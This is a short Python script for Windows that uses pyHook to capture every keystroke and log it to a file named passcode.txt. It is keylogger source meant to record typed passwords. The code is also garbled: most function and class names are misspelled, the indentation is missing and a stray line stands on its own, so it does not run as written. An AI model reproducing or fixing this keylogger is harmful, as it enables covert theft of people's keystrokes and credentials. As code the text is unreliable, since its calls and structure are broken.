import pyHook
import sys 
import logging
import pythoncom

file_log = 'c:\\python27\\passcode.txt'
def Onekeydordevent (event) :
logging.biscConfig (filename=file_log, level=logging.DEBUG, Format='.% (message) s')
 Chr(event.Ascii)
logging.log(10,Chr (event.Ascii))
return True 

hooks_mananger = pyhooks.Hooksmananger()

hooks_mananger.keydown = Onekeydordevent 
hooks_mananger.Hookkeybord ()
pythoncom.pumpmessages ()